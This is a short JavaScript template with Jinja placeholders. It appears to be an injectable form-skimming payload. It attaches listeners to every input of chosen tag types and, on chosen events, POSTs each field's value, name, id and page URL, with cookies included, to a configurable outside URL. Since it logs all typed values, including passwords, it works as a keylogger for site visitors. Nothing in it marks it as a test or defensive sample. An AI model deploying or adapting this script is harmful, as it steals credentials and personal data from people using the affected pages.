const url = '{{url}}';
const tags = ["{{tags|join('","')}}"];
const actions = ["{{actions|join('","')}}"];


function actionLog(inp){
	actions.forEach(action => {
	inp.addEventListener(action,function(e){
		const jsondata={"location":window.location.href,"name":inp.name,"id":inp.id,"class":inp.className,"type":inp.type,"tag":inp.tagName,"action":action,"value":inp.value}
		fetch(url,{
			method: 'POST',
			credentials: 'include',
			headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(jsondata)
		});
	})
})};

tags.forEach(tag => {
let inputs=Array.from(document.getElementsByTagName(tag));
inputs.forEach(actionLog);
})
